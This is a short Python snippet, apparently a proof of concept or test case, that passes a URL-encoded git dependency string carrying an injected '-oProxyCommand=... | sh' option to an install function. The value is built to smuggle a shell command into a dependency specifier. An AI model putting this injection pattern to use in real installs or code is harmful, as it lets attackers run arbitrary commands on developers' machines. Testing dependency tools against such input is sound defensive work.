import poetry

def install_dependency(dependency):
    poetry.install(dependency)

dependency = "git+-oProxyCommand=echo%20%27Malicious%20command%27%20|%20sh"
install_dependency(dependency)